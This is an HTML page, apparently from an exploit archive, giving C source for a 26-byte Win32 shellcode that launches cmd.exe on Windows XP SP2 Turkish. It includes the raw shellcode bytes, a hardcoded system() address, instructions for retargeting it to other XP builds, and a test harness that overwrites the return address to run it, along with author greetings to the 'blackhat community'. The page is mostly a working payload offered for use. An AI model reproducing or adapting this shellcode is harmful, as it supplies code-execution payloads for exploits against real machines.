<html><head><title>Windows - Shellcode (cmd.exe) for XP SP2 Turkish - 26 Bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 
26 Bytes Win32 Shellcode (cmd.exe) for XP SP2 Turkish
 
Author: Hellcode Research || TCC (The Computer Cheats)
http://tcc.hellcode.net
memberz: celil 'karak0rsan unuver , murderkey,  murat kaslioglu, bob
 
from murderkey: I love you merve lol     
from karak0rsan: fuck u &quot;ysmn&quot; lol || eternal love kubr4 ||
notebookumu calan hirsiz kurcalarsa l33t h4x0r olabilir ahahaha :]
merak etme mkey, en kisa zamanda giden 0dayleri tekrar toplucam ;]
 
 
Greetz: AhmetBSD aka L4M3R, GOBBLES and all blackhat community
 
&quot;\xc7\x93\xc1\x77&quot; is the system address. (0x77c193c7)
You can change it if you use another XP. (e.g SP2 FR, SP3 Turkish etc.)
(Open MSVCRT.DLL via Dependency Walker,
find system function's address and MSVCRT's Preferred Base address
system + preferred base = System Address ;] )
 
 
*/
 
 
#include &lt;windows.h&gt;
#include &lt;winbase.h&gt;
 
 
unsigned char hellcodenet[]=
&quot;\x8b\xec\x55\x8b\xec&quot;
&quot;\x68\x65\x78\x65\x2F&quot;
&quot;\x68\x63\x6d\x64\x2e&quot;
&quot;\x8d\x45\xf8\x50\xb8&quot;
&quot;\xc7\x93\xc1\x77&quot;
&quot;\xff\xd0&quot;
;
 
int main ()
{
int *ret;
ret=(int *)&amp;ret+2;
(*ret)=(int)hellcodenet;
return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
